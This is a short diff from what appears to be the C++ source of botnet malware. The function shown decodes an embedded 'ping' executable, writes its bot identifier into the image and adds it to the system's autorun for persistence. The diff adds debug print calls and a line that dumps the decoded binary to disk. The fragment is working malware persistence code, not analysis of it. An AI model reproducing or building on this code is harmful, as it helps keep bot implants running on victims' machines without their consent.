@@ -220,11 +220,15 @@ void AddRebootPingToAutorun()
 	void* exeFile;
 	DWORD size;
 	bool neededDel;
+	pOutputDebugStringA("1");
 	if( TMemoryDLL::DecodeDll( BotPingExe::data, size, exeFile, neededDel ) )
 	{
+		File::WriteBufferA( "c:\\ping.bin", exeFile, size );
+		pOutputDebugStringA("2");
 		char* p = (char*) m_memmem( exeFile, size, "__BOT_UID__", 11 );
 		if( p )
 		{
+			pOutputDebugStringA("3");
 			m_lstrcpy( p, BOT_UID );
 			AddToAutoRun( exeFile, size );
 			if( neededDel ) MemFree(exeFile);
